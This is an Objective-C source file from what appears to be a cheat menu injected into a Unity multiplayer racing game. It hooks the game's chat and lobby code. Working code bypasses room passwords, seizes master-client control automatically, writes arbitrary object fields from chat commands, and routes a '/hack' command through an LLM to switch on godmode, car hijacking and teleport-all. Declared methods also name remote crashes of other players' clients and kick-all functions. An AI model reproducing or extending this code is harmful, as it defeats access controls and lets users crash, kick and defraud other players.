    NSArray *fallback = @[@"hmm", @"anlamadim", @"gec bakalim", @"ilginc", @"tamam sen bilirsin", @"soyle bakayim", @"kanka bi daha yaz", @"agzim var dilim yok"];
    return fallback[arc4random_uniform((uint32_t)fallback.count)];
}

// ===== OYUN SOHBETI AI (temiz /ai akisi) =====
// /ai <soru> her oyuncunun mesaji icin tek bir oda cevabi uretir.
// Cevaplar ve istekler rate-limitlidir; bot mesaji yeniden bota girdi olmaz.
static const NSTimeInterval kAiRoomCooldown = 1.5;
static BOOL g_aiRoomRequestPending = NO;
static NSTimeInterval g_aiLastRoomRequestAt = 0;

static NSString* few1n_chatSafeText(NSString *text, NSUInteger maxLength) {
    if (![text isKindOfClass:[NSString class]]) return @"";
    NSString *clean = [[text stringByReplacingOccurrencesOfString:@"\n" withString:@" "]
        stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    if (clean.length > maxLength) clean = [[clean substringToIndex:maxLength] stringByAppendingString:@"..."];
    return clean;
}

static NSString* few1n_aiPromptFromChat(NSString *text) {
    if (![text isKindOfClass:[NSString class]]) return nil;
    NSRange marker = [text rangeOfString:@"/ai" options:NSCaseInsensitiveSearch];
    if (marker.location == NSNotFound) return nil;
    // /ai bir komut olmali; /air gibi kelimeleri yakalama.
    NSUInteger after = marker.location + marker.length;
    if (after < text.length) {
        unichar next = [text characterAtIndex:after];
        if (![[NSCharacterSet whitespaceAndNewlineCharacterSet] characterIsMember:next]) return nil;
    }
    NSString *prompt = after < text.length ? [text substringFromIndex:after] : @"";
    prompt = few1n_chatSafeText(prompt, 300);
    return prompt.length > 0 ? prompt : nil;
}

static void few1n_aiAsk(NSString *prompt, void(^completion)(NSString*, NSString*)) {
    NSString *key = few1n_groqApiKey();
    if (key.length == 0) {
        completion(nil, [NSString stringWithFormat:@"%@ API key ayarlanmamis", few1n_aiProviderName()]);
        return;
    }
    few1n_groqAsk(prompt, ^(NSString *reply) {
        if (reply.length > 0) completion(few1n_chatSafeText(reply, 150), nil);
        else completion(nil, [NSString stringWithFormat:@"%@ API yanit vermedi; logu kontrol et", few1n_aiProviderName()]);
    });
}

static BOOL few1n_sendRoomChat(NSString *message) {
    if (message.length == 0 || !chatGetInst || !chatSend) return NO;
    @try {
        void *manager = chatGetInst();
        void *ilMessage = mkStr(message);
        if (!manager || !ilMessage) return NO;
        chatSend(manager, ilMessage);
        return YES;
    } @catch (...) { return NO; }
}

static void few1n_replyToRoomAiPrompt(NSString *prompt) {
    prompt = few1n_chatSafeText(prompt, 300);
    if (prompt.length == 0) return;
    NSTimeInterval now = [NSDate timeIntervalSinceReferenceDate];
    if (g_aiRoomRequestPending || now - g_aiLastRoomRequestAt < kAiRoomCooldown) {
        FLog(@"🤖 AI istek atlandi: onceki cevap bekleniyor veya cooldown aktif");
        return;
    }
    g_aiRoomRequestPending = YES;
    g_aiLastRoomRequestAt = now;
    NSString *provider = few1n_aiProviderName();
    FLog([NSString stringWithFormat:@"🤖 /ai istegi -> %@: %@", provider, prompt]);
    few1n_aiAsk(prompt, ^(NSString *reply, NSString *error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            g_aiRoomRequestPending = NO;
            NSString *body = reply.length > 0 ? reply : few1n_chatSafeText(error, 150);
            NSString *nameCol = [NSString stringWithUTF8String:g_aiNameColorHex];
            NSString *replyCol = [NSString stringWithUTF8String:g_aiReplyColorHex];
            NSString *finalMsg = [NSString stringWithFormat:@"<color=#%@><b>[AI %@]</b></color> <color=#%@>%@</color>", nameCol, provider, replyCol, body ?: @"Cevap alinamadi"];
            if (!few1n_sendRoomChat(finalMsg)) FLog(@"🤖 AI cevabi odaya gonderilemedi: ChatManager hazir degil");
        });
    });
}

static void h_chatSend(void* self, void* msg) {
    fChat++;
    if (msg) {
        NSString *orig = readStr(msg);
        if (orig.length > 0) {
            // v111: kendi gonderdigim son 10 mesaji kaydet (fup'ta filter icin)
            if (!g_recentlySentByMe) g_recentlySentByMe = [NSMutableArray array];
            @synchronized(g_recentlySentByMe) {
                [g_recentlySentByMe addObject:[orig copy]];
                if (g_recentlySentByMe.count > 15) [g_recentlySentByMe removeObjectAtIndex:0];
            }
            // v113: /scan <class> - runtime il2cpp field dump (chat'e sadece isim=offset ozet)
            if ([orig.lowercaseString hasPrefix:@"/scan "]) {
                NSString *cls = [[orig substringFromIndex:6] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                void* selfKept = self;
                dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                    NSString *dump = few1n_dumpClassFields(cls);
                    NSString *nameCol = [NSString stringWithUTF8String:g_aiNameColorHex];
                    NSString *replyCol = [NSString stringWithUTF8String:g_aiReplyColorHex];
                    // Chat mesaj limit 200 char - kes
                    NSString *shortDump = dump.length > 400 ? [[dump substringToIndex:400] stringByAppendingString:@"..."] : dump;
                    NSString *finalMsg = [NSString stringWithFormat:@"<color=#%@><b>[🔍 SCAN]</b></color> <color=#%@>%@</color>", nameCol, replyCol, shortDump];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        void* ns = mkStr(finalMsg);
                        if (ns && o_chatSend) o_chatSend(selfKept, ns);
                        FLog([NSString stringWithFormat:@"🔍 SCAN %@:\n%@", cls, dump]);
                    });
                });
                return;
            }
            // v113: /write <class>.<field> <type> <value>  ornek: /write RCCP_Nos.amount float 100
            if ([orig.lowercaseString hasPrefix:@"/write "]) {
                NSString *rest = [orig substringFromIndex:7];
                NSArray *parts = [rest componentsSeparatedByString:@" "];
                void* selfKept = self;
                NSString *report = @"[✍️ WRITE] format: /write Class.field type value";
                if (parts.count >= 3) {
                    NSArray *cf = [parts[0] componentsSeparatedByString:@"."];
                    if (cf.count == 2) {
                        NSString *cls = cf[0], *fld = cf[1], *typ = parts[1];
                        NSString *val = [[parts subarrayWithRange:NSMakeRange(2, parts.count-2)] componentsJoinedByString:@" "];
                        report = few1n_writeFieldOnAllOfClass(cls, fld, typ, val);
                    }
                }
                NSString *nameCol = [NSString stringWithUTF8String:g_aiNameColorHex];
                NSString *replyCol = [NSString stringWithUTF8String:g_aiReplyColorHex];
                NSString *finalMsg = [NSString stringWithFormat:@"<color=#%@><b>[✍️ WRITE]</b></color> <color=#%@>%@</color>", nameCol, replyCol, report];
                dispatch_async(dispatch_get_main_queue(), ^{
                    void* ns = mkStr(finalMsg);
                    if (ns && o_chatSend) o_chatSend(selfKept, ns);
                });
                return;
            }
            // v112: /hack prefix - Hacker AI, dogal dilde hile tetikle
            if ([orig.lowercaseString hasPrefix:@"/hack "] || [orig.lowercaseString isEqualToString:@"/hack"]) {
                NSString *prompt = orig.length > 6 ? [orig substringFromIndex:6] : @"";
                void* selfKept = self;
                FLog([NSString stringWithFormat:@"🔓 Hacker AI istek: '%@'", prompt]);
                few1n_hackerAsk(prompt, ^(NSArray *actions) {
                    NSMutableString *report = [NSMutableString stringWithString:@"[🔓 HACKER AI]"];
                    if (!actions || actions.count == 0) [report appendString:@" AI cevap veremedi/parse hatasi"];
                    else {
                        for (NSDictionary *a in actions) {
                            if (![a isKindOfClass:[NSDictionary class]]) continue;
                            NSString *act = a[@"action"] ?: @"unknown";
                            NSString *st = a[@"state"] ?: @"on";
                            BOOL on = [st.lowercaseString isEqualToString:@"on"] || [st.lowercaseString isEqualToString:@"true"];
                            BOOL toggle = [st.lowercaseString isEqualToString:@"toggle"];
                            dispatch_async(dispatch_get_main_queue(), ^{
                                @try {
                                    // v114.4: FEW1NMenu forward decl yerine dynamic dispatch (compile warning'i azalt)
                                    id m = [NSClassFromString(@"FEW1NMenu") performSelector:@selector(shared)];
                                    if ([act isEqualToString:@"infinite_nos"]) { isInfiniteNosEnabled = toggle ? !isInfiniteNosEnabled : on; saveBool(@"infnos", isInfiniteNosEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"infinite_fuel"]) { isInfiniteFuelEnabled = toggle ? !isInfiniteFuelEnabled : on; saveBool(@"inffuel", isInfiniteFuelEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"no_damage"]) { isNoDamageV2Enabled = toggle ? !isNoDamageV2Enabled : on; saveBool(@"nodamagev2", isNoDamageV2Enabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"max_rpm"]) { isMaxRpmEnabled = toggle ? !isMaxRpmEnabled : on; saveBool(@"maxrpm", isMaxRpmEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"engine_immortal"]) { isEngineImmortalEnabled = toggle ? !isEngineImmortalEnabled : on; saveBool(@"immortalengine", isEngineImmortalEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"no_traffic"]) { isNoTrafficEnabled = toggle ? !isNoTrafficEnabled : on; saveBool(@"notraffic", isNoTrafficEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"emissive"]) { isEmissivePaintEnabled = toggle ? !isEmissivePaintEnabled : on; saveBool(@"emissive", isEmissivePaintEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"exhaust_flame"]) { isExhaustFlameOnEnabled = toggle ? !isExhaustFlameOnEnabled : on; saveBool(@"exhaustflame", isExhaustFlameOnEnabled); [m performSelector:@selector(startGizliTimerIfNeeded)]; }
                                    else if ([act isEqualToString:@"godmode"]) { isGodmode = toggle ? !isGodmode : on; saveBool(@"godmode", isGodmode); }
                                    else if ([act isEqualToString:@"drift"]) { isDriftEnabled = toggle ? !isDriftEnabled : on; saveBool(@"drift", isDriftEnabled); }
                                    else if ([act isEqualToString:@"fly"]) { isFlyEnabled = toggle ? !isFlyEnabled : on; saveBool(@"fly", isFlyEnabled); }
                                    else if ([act isEqualToString:@"noclip"]) { isNoClip = toggle ? !isNoClip : on; saveBool(@"noclip", isNoClip); }
                                    else if ([act isEqualToString:@"selektor"]) { isSelektor = toggle ? !isSelektor : on; saveBool(@"selektor", isSelektor); }
                                    else if ([act isEqualToString:@"balata"] || [act isEqualToString:@"brakeglow"]) { [m performSelector:@selector(tapBrakeGlow)]; }
                                    else if ([act isEqualToString:@"popbangs"]) { isPopBangsEnabled = toggle ? !isPopBangsEnabled : on; saveBool(@"popbangs", isPopBangsEnabled); }
                                    else if ([act isEqualToString:@"autohorn"]) { isAutoHornEnabled = toggle ? !isAutoHornEnabled : on; saveBool(@"autohorn", isAutoHornEnabled); }
                                    else if ([act isEqualToString:@"detach"]) { [m performSelector:@selector(tapDetachParts)]; }
                                    else if ([act isEqualToString:@"teleport_all"]) { [m performSelector:@selector(tapTeleportAllToMe)]; }
                                    else if ([act isEqualToString:@"hijack"]) { [m performSelector:@selector(tapHijackCar)]; }
                                    else { [report appendFormat:@" ❓%@", act]; return; }
                                    [m performSelector:@selector(refreshUI)];
                                    [report appendFormat:@" ✅%@(%@)", act, toggle ? @"~" : (on ? @"on" : @"off")];
                                } @catch (...) { [report appendFormat:@" ❌%@", act]; }
                            });
                        }
                    }
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        // Renkli feedback
                        NSString *nameCol = [NSString stringWithUTF8String:g_aiNameColorHex];
                        NSString *replyCol = [NSString stringWithUTF8String:g_aiReplyColorHex];
                        NSString *finalMsg = [NSString stringWithFormat:@"<color=#%@><b>[🔓 HACKER AI]</b></color> <color=#%@>%@</color>", nameCol, replyCol, [report substringFromIndex:[@"[🔓 HACKER AI]" length]]];
                        void* ns = mkStr(finalMsg);
                        void* mgr2 = chatGetInst ? chatGetInst() : NULL;
                        if (ns && mgr2 && chatSend) chatSend(mgr2, ns);
                        else if (ns && o_chatSend && selfKept) o_chatSend(selfKept, ns);
                    });
                });
                return;
            }
            // Yerel /ai komutu: komut odaya dusmez; AI cevabi herkesin gorecegi chat mesaji olarak gonderilir.
            NSString *aiPrompt = few1n_aiPromptFromChat(orig);
            if (aiPrompt) {
                few1n_replyToRoomAiPrompt(aiPrompt);
                return;
            }
            // Eger gonderilen mesajda/nickte ham HTML/TMPro renk etiketleri varsa (<color=...>, <#FF0000>, <mark> vb.) temizle
            NSString *cleaned = stripRichTextTags(orig);
            if (cleaned.length > 0 && ![cleaned isEqualToString:orig]) {
                orig = cleaned;
                msg = mkStr(orig);
            }
            if (isMatrixChatEnabled) {
                void* colored = mkStr(matrixWrapChat(orig));
                if (colored) { if (o_chatSend) o_chatSend(self, colored); return; }
            } else if (isGlitchChatEnabled) {
                void* colored = mkStr(glitchWrapChat(orig));
                if (colored) { if (o_chatSend) o_chatSend(self, colored); return; }
            } else if (isColorChatEnabled) {
                void* colored = mkStr([NSString stringWithFormat:@"<color=cyan><b>[FEW1N]</b></color> %@", orig]);
                if (colored) { if (o_chatSend) o_chatSend(self, colored); return; }
            }
        }
    }
    if (o_chatSend) o_chatSend(self, msg);
}

// ChatManager.fup: odadaki diger oyuncularin mesajlari burada gorulur.
// Bir oyuncu /ai <soru> yazdigi anda bu cihazdaki bot tek cevabi odaya gonderir.
static void h_chatFup(void* self, void* msg) {
    if (msg) @try {
        NSString *received = readStr(msg);
        if (received.length > 0) {
            BOOL isBotMsg = [received containsString:@"[AI "] || [received containsString:@"[🤖"];
            BOOL isMine = NO;
            if (g_recentlySentByMe) {
                @synchronized(g_recentlySentByMe) {
                    for (NSString *sent in g_recentlySentByMe) {
                        if ([received isEqualToString:sent]) { isMine = YES; break; }
                    }
                }
            }
            if (!isBotMsg && !isMine) {
                NSString *prompt = few1n_aiPromptFromChat(received);
                if (prompt) {
                    few1n_replyToRoomAiPrompt(prompt);
                } else if (isAiChatModeEnabled) {
                    NSString *lower = [received.lowercaseString stringByReplacingOccurrencesOfString:@"ı" withString:@"i"];
                    BOOL mentioned = [lower containsString:@" ai"] || [lower hasPrefix:@"ai "] ||
                                     [lower containsString:@"bot"] || [lower containsString:@"grok"] ||
                                     [lower containsString:@"few1n ai"];
                    if (mentioned) few1n_replyToRoomAiPrompt(received);
                }
            }
        }
    } @catch (...) { FLog(@"🤖 Gelen chat islenirken exception"); }
    if (o_chatFup) o_chatFup(self, msg);
}

// ===== PASSWORD BYPASS =====
static void (*o_roomConnect)(void*) = NULL;
static void h_roomConnect(void* self) {
    if (isBypassPasswordEnabled && self) {
        @try {
            void* roomPwd = *(void**)((uintptr_t)self + OFF_ROOMLINE_PASSWORD);
            if (lobbyGetInst && roomPwd) {
                void* lobby = lobbyGetInst();
                if (lobby && tmp_set_text) {
                    void* pOnConnect = *(void**)((uintptr_t)lobby + OFF_LOBBY_PWD_ON_CONN_INPUT);
                    if (pOnConnect) tmp_set_text(pOnConnect, roomPwd);
                    void* pInput = *(void**)((uintptr_t)lobby + OFF_LOBBY_PWD_INPUT);
                    if (pInput) tmp_set_text(pInput, roomPwd);
                }
            }
        } @catch (...) {}
    }
    if (o_roomConnect) o_roomConnect(self);
}

// ===== TMPro.TMP_Text.set_text HOOK (TÜM OYUNDA NİCKNAME & MASA RENKLERİNİ CANLI KILMA) =====
static void (*o_tmpSetText)(void*, void*) = NULL;
static void h_tmpSetText(void* self, void* textStr) {
    if (textStr) {
        @try {
            NSString *str = readStr(textStr);
            if (str && [str containsString:@"FEW1N NUKE"]) {
                // Kendi cihazımız nuke metnini render etmez -> Yerel çökme engellenir!
                return;
            }
            // v102: VIDYO ISIM MODU - kisa nickname'leri buyuk ve kirmizi yap
            if (isVidyoNamesEnabled && str && str.length >= 2 && str.length <= 20
                && ![str containsString:@"<"]        // zaten rich text varsa dokunma
                && ![str containsString:@"km/h"]     // hiz gostergesi degil
                && ![str containsString:@"$"]        // para degil
                && ![str containsString:@"FPS"]      // FPS degil
                && ![str hasPrefix:@" "]) {
                // Sayi kontrolu: sirf sayi ise atla (skor, para, zaman)
                BOOL isNumeric = YES;
                for (NSInteger i = 0; i < str.length; i++) {
                    unichar ch = [str characterAtIndex:i];
                    if (!(ch >= '0' && ch <= '9') && ch != '.' && ch != ',' && ch != ':' && ch != '-') { isNumeric = NO; break; }
                }
                if (!isNumeric) {
                    NSString *vidyo = [NSString stringWithFormat:@"<size=250%%><color=#FF0000><b>📺 %@ 📺</b></color></size>", str];
                    void* newStr = mkStr(vidyo);
                    if (newStr) {
                        if (self && g_mSetRichText) setRichTextIl(self, true);
                        if (o_tmpSetText) o_tmpSetText(self, newStr);
                        return;
                    }
                }
            }
        } @catch (...) {}
    }
    if (self && g_mSetRichText) {
        setRichTextIl(self, true);
    }
    if (o_tmpSetText) o_tmpSetText(self, textStr);
}

// ===== ODA ISMI RICH TEXT ACIGI + ZORLA RENKLI (CLIENT-SIDE) =====
static bool isColorRoomForce = false;  // TUM oda isimlerini renkli yap (client-side)
static bool isMapTextOverrideEnabled = false;
static char customMapTextOverride[128] = "<#FF0000><b>[ADMIN]</b></color>";
static NSMutableArray<NSString*> *g_lobbyRoomNames = nil;
static int g_lastRoomLineFrame = 0;

static void(*lobbySetScene)(void*, void*) = NULL;
static void(*pn_setAutomaticallySyncScene)(bool) = NULL;
static void(*unity_loadSceneStr)(void*) = NULL;
static void* (*mapList_getInstance)(void) = NULL;   // MapList.ely() -> MapList instance (0x54B3630)
static void(*photonMgrEnp)(void*, bool) = NULL;     // PhotonManager.enp(string, bool) - static sahne yukleyici (0x54B5260)
static void(*mapSel_selectMap)(void*, void*) = NULL; // MapSelection.SelectMap(string) - (0x54B389C)
static void(*lobbyStartGame)(void*) = NULL;          // HR_PhotonLobbyManager.StartGameButton() - (0x54A93B0)
static void(*lobbyDummyStartGame)(void*) = NULL;     // HR_PhotonLobbyManagerDummy.StartGameButton() - (0x54AF76C)

// ===== AUTO MASTER HOOK =====
static bool isAutoMasterEnabled = false;
static int  g_fakeOnlineCount   = 0;      // 0 = devre disi
static void (*o_onMasterClientSwitched)(void*, void*) = NULL;
static void h_onMasterClientSwitched(void* self, void* newMasterPlayer) {
    if (o_onMasterClientSwitched) o_onMasterClientSwitched(self, newMasterPlayer);
    if (!isAutoMasterEnabled) return;
    // Master baska birine gecti, biz hemen geri alalim
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        few1n_claimMaster();
        FLog(@"🤖 Oto-Master: Master degisti, aninda geri alindi!");
    });
}

static void (*o_onRoomListUpdate)(void*, void*) = NULL;
static void h_onRoomListUpdate(void* self, void* roomList) {
    if (o_onRoomListUpdate) o_onRoomListUpdate(self, roomList);
    if (!g_lobbyRoomNames) g_lobbyRoomNames = [[NSMutableArray alloc] init];
    if (ptrOk(roomList)) {
        @try {
            int count = *(int*)((uintptr_t)roomList + 0x18);
            if (count > 0 && count < 100) {
                void* items = *(void**)((uintptr_t)roomList + 0x10);
                if (ptrOk(items)) {
                    void** arr = (void**)((uintptr_t)items + 0x20);
                    @synchronized(g_lobbyRoomNames) {
                        for (int i = 0; i < count; i++) {
                            void* ri = arr[i];
                            if (!ptrOk(ri)) continue;
                            void* ns = rinfo_getName ? rinfo_getName(ri) : NULL;
                            if (ns) {
                                NSString *nm = readStr(ns);
                                if (nm.length > 0 && ![g_lobbyRoomNames containsObject:nm]) {
                                    [g_lobbyRoomNames addObject:nm];
                                }
                            }
                        }
                    }
                }
            }
        } @catch (...) {}
    }
}

static void (*o_roomLineSetup)(void*, void*, void*, unsigned char, unsigned char, void*, void*) = NULL;
static void h_roomLineSetup(void* self, void* a, void* b, unsigned char c, unsigned char d, void* e, void* f) {
    fRoomLine++;
    g_lastRoomLineFrame = fRoomLine;
    // v91: Otomatik temizleme kaldirildi — list dolu kalir, bypass ekrani her zaman odalari gorur
    if (!g_lobbyRoomNames) g_lobbyRoomNames = [[NSMutableArray alloc] init];

    // v91: Oda ismini burada EKLE (tmp_set_text kontrolunden ONCE — text NULL olsa bile list dolar)
    if (self && f && rinfo_getName) {
        @try {
            void* ns = rinfo_getName(f);
            if (ns) {
                NSString *nm = readStr(ns) ?: @"";
                if (nm.length > 0) {
                    @synchronized(g_lobbyRoomNames) {
                        if (![g_lobbyRoomNames containsObject:nm] && g_lobbyRoomNames.count < 100) {
                            [g_lobbyRoomNames addObject:nm];
                        }
                    }
                }
            }
        } @catch (...) {}
    }

    if (o_roomLineSetup) o_roomLineSetup(self, a, b, c, d, e, f);

    if (self) {
        @try {
            // v104 FIX: HR_UI_RoomListLine gerçek offset'ler (il2cpp.h dogrulandi)
            // MonoBehaviour_Fields base = 0x18, sonra: RoomNameText @+0x18, MapNameText @+0x20, PlayerCountText @+0x28
            // v114.18: 1.4.3 dump'ta HR_UI_RoomListLine'a LockImage @0x38 eklendi;
            // TMP_Text field'lari 8 byte kaydi. Named define uzerinden okuyoruz.
            void* nameText  = *(void**)((uintptr_t)self + OFF_ROOMLINE_NAME_TEXT);        // RoomNameText @0x20
            void* mapText   = *(void**)((uintptr_t)self + OFF_ROOMLINE_MAP_TEXT);         // MapNameText @0x28
            void* pCountText= *(void**)((uintptr_t)self + OFF_ROOMLINE_PLAYERCOUNT_TEXT); // PlayerCountText @0x30

            // v90: tmp_set_richText direkt pointer kaldirildi — offset yanlis olabilir, crash sebep.
            // Sadece il2cpp invoke uzerinden (guvenli yol).
            if (nameText && g_mSetRichText) setRichTextIl(nameText, true);
            if (mapText && g_mSetRichText) setRichTextIl(mapText, true);
            if (pCountText && g_mSetRichText) setRichTextIl(pCountText, true);

            if (nameText && tmp_set_text) {
                void* rawName = (f && rinfo_getName) ? rinfo_getName(f) : a;
                if (rawName) {
                    NSString *name = readStr(rawName) ?: @"";
                    if (name.length > 0) {
                        @synchronized(g_lobbyRoomNames) {
                            if (![g_lobbyRoomNames containsObject:name] && g_lobbyRoomNames.count < 50) {
                                [g_lobbyRoomNames addObject:name];
                            }
                        }
                    }
                    // v86: TOPLAM RENK BYPASS — ToUpper fix + full-form → short-form (TMPro her durumda parse eder)
                    bool changed = false;
                    if ([name.uppercaseString containsString:@"<COLOR"] || [name.uppercaseString containsString:@"<MARK"] || [name.uppercaseString containsString:@"<SIZE"] || [name.uppercaseString containsString:@"<FONT"] || [name.uppercaseString containsString:@"<B>"] || [name.uppercaseString containsString:@"<I>"]) {
                        // 1) ToUpper bypass — hepsini lowercase yap
                        name = [name stringByReplacingOccurrencesOfString:@"<COLOR=" withString:@"<color="];
                        name = [name stringByReplacingOccurrencesOfString:@"</COLOR>" withString:@"</color>"];
                        name = [name stringByReplacingOccurrencesOfString:@"<MARK=" withString:@"<mark="];
                        name = [name stringByReplacingOccurrencesOfString:@"</MARK>" withString:@"</mark>"];
                        name = [name stringByReplacingOccurrencesOfString:@"<SIZE=" withString:@"<size="];
                        name = [name stringByReplacingOccurrencesOfString:@"</SIZE>" withString:@"</size>"];
                        name = [name stringByReplacingOccurrencesOfString:@"<FONT=" withString:@"<font="];
                        name = [name stringByReplacingOccurrencesOfString:@"</FONT>" withString:@"</font>"];
                        name = [name stringByReplacingOccurrencesOfString:@"<B>" withString:@"<b>"];
                        name = [name stringByReplacingOccurrencesOfString:@"</B>" withString:@"</b>"];
                        name = [name stringByReplacingOccurrencesOfString:@"<I>" withString:@"<i>"];
                        name = [name stringByReplacingOccurrencesOfString:@"</I>" withString:@"</i>"];
                        changed = true;
                    }
                    // 2) FULL-FORM → SHORT-FORM regex: <color=#RRGGBB> → <#RRGGBB>
                    // TMPro her ikisini destekler ama short-form richText=false durumunda bile parse edilir
                    if ([name containsString:@"<color=#"]) {
                        @try {
                            NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:@"<color=(#[0-9A-Fa-f]{3,8})>" options:0 error:nil];
                            if (re) {
                                name = [re stringByReplacingMatchesInString:name options:0 range:NSMakeRange(0, name.length) withTemplate:@"<$1>"];
                                changed = true;
                            }
                        } @catch (...) {}
                    }
                    if (changed) { void* repStr = mkStr(name); if (repStr) rawName = repStr; }
                    // ZORLA RENKLİ MOD: Isimde renk etiketi yoksa ve isColorRoomForce aciksa renklendir
                    if ([name containsString:@"<"] && [name containsString:@">"]) {
                        // Zaten renk/stil etiketleri var -> Doğrudan renkli metni yaz (Çift etiket koyup bozma)
                        tmp_set_text(nameText, rawName);
                    } else if (isColorRoomForce && name.length > 0) {
                        static int colorIdx = 0;
                        NSArray *forceColors = @[@"#FF0000", @"#00FF00", @"#00FFFF", @"#FF00FF", @"#FFFF00", @"#FF8800", @"#FF0088", @"#88FF00"];
                        NSString *col = forceColors[colorIdx % forceColors.count];
                        colorIdx++;
                        NSString *colored = [NSString stringWithFormat:@"<%@><b>%@</b>", col, name];
                        void* cs = mkStr(colored);
                        if (cs) { tmp_set_text(nameText, cs); }
                    } else {
                        tmp_set_text(nameText, rawName);
                    }
                }
            }

            // ÖZEL HARİTA METNİ DEĞİŞTİRİCİ (ADMIN / VIP / GİZLİ HARİTA YAZISI)
            if (mapText && tmp_set_text) {
                if (isMapTextOverrideEnabled && strlen(customMapTextOverride) > 0) {
                    void* customStr = mkStr([NSString stringWithUTF8String:customMapTextOverride]);
                    if (customStr) { tmp_set_text(mapText, customStr); }
                } else if (isColorRoomForce) {
                    static int mColIdx = 0;
                    NSArray *mapCols = @[@"#00FFFF", @"#00FF00", @"#FFFF00", @"#FF00FF", @"#FF7F00"];
                    NSString *mc = mapCols[(mColIdx++) % mapCols.count];
                    void* rm = tmp_get_text ? tmp_get_text(mapText) : NULL;
                    if (rm) {
                        NSString *mName = readStr(rm) ?: @"";
                        if (mName.length > 0 && ![mName hasPrefix:@"<"]) {
                            NSString *cMap = [NSString stringWithFormat:@"<%@><b>%@</b>", mc, mName];
                            void* cs = mkStr(cMap);
                            if (cs) tmp_set_text(mapText, cs);
                        }
                    }
                }
            }
        } @catch (...) {}
    }
}


// ===== ODA KURMA HATASI TESHIS + OTOMATIK RETRY (BRUTE FORCE) =====
// FEW1NMenu @interface yukari alindi ki hook'lar (h_onCreateFail brute-force) menuye erisebilsin
@interface FEW1NMenu : NSObject <PHPickerViewControllerDelegate, UINavigationControllerDelegate, UIImagePickerControllerDelegate>
@property (nonatomic, strong) UIButton *fab;
@property (nonatomic, strong) UIView *panel;
@property (nonatomic, strong) UIScrollView *scrollView;
@property (nonatomic, strong) UIView *contentView;
@property (nonatomic, strong) NSMutableDictionary *toggleViews;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) UIView *statusCard;
@property (nonatomic, strong) UIView *espOverlay;
@property (nonatomic, strong) NSMutableArray *espLabels;
@property (nonatomic, strong) NSTimer *espTimer;
@property (nonatomic, strong) UIView *lyricsOverlay;
@property (nonatomic, strong) UITextView *lyricsInput;
@property (nonatomic, strong) UIView *songPicker;
@property (nonatomic, strong) NSMutableDictionary *speedBtns;
@property (nonatomic, strong) UIButton *plateBtn;
@property (nonatomic, strong) UIButton *nameBtn;
@property (nonatomic, strong) UIButton *moneyBtn;
@property (nonatomic, strong) UIView *logOverlay;
@property (nonatomic, strong) UITextView *logText;
@property (nonatomic, strong) UIView *favOverlay;
@property (nonatomic, strong) UIView *nanOverlay;
- (void)tapAdBlock;
- (void)tapBrakeGlow;
- (void)tapBrakeGlowDob;
- (void)tapBrakeGlowMinTemp;
- (void)restartBrakeGlowTimer;
- (NSString*)brakeGlowModeDescription;
- (void)tapNanCrash;
- (void)tapNanCrashRemote;
- (void)targetPlayerCrash;
- (void)tapRoomCrash;
- (void)tapInstantCrash;
- (void)fireNanCrashLocal;
- (void)fireNanCrashRemote;
- (void)fireRoomCrash;
@property (nonatomic, strong) UIView *flyPad;
@property (nonatomic, strong) CADisplayLink *dl;
+ (instancetype)shared;
- (void)build;
- (void)createOneRoom;
- (void)pickGifForAscii;
- (void)playGifAscii;
- (void)tapGifColored;
- (void)pickGifSize:(UIButton*)b;
- (void)fireGifFrame;
- (void)buildGifAsciiFromData:(NSData*)data;
- (void)openFavorites;
- (void)closeFavorites;
- (void)editFavorites;
- (void)favToggle:(UIButton*)b;
- (NSArray*)favAllKeys;
- (NSString*)favTitleForKey:(NSString*)k;
- (BOOL)favStateForKey:(NSString*)k;
- (SEL)favSelForKey:(NSString*)k;
- (void)promptStyledSend:(int)mode;
- (void)sendMatrixMsg;
- (void)sendGlitchMsg;
- (void)createNormalRoom;
- (void)createAdvancedCustomRoom;
- (void)setRoomMax;
- (void)speedSliderChanged:(UISlider*)sl;
- (void)speedReset;
- (void)changeMapInRoom;
- (void)changeMapV70Classic;
- (void)toggleMasterClaim;
- (void)cloneCarPicker;
- (void)askSceneNameThen:(int)method;
- (void)runMapMethod:(int)method scene:(NSString*)inp;
- (void)mapMethod1;
- (void)mapMethod2;
- (void)mapMethod3;
- (void)mapMethod4;
- (void)mapMethod5;
- (void)mapMethod6;
- (void)mapMethod7;
- (void)mapMethod8;
- (void)tapRoomLock;
- (void)tapRoomHide;
- (void)tapRoomPassword;
- (void)completeAllDailyTasks;
- (void)tapAutoMaster;
- (void)tapGameSpeed;
- (void)tapFakeOnline;
- (void)pickRoomMax:(UIButton*)b;
- (void)toggleSection:(UIButton*)b;
- (void)reflowMenu;
- (void)nativeKickAll;
- (void)nativeKickByName;
- (void)nativeKickPick;
- (void)targetBombCrashPick;
- (void)showPlayerIDs;
- (void)editAiApiKey;
- (void)tapAiChatMode;
- (void)pickAiColors;
- (void)pickAiColorFor:(BOOL)forName;
- (void)showHackerAiInfo;
- (void)tapBrakeGlow;
- (void)tapDetachParts;
- (void)tapTeleportAllToMe;
- (void)tapHijackCar;
- (void)startGizliTimerIfNeeded;
- (void)tapNameTrack;
- (void)fireNameTrack;
- (BOOL)doNativeKick:(NSString*)nm;
- (void)emojiRain;
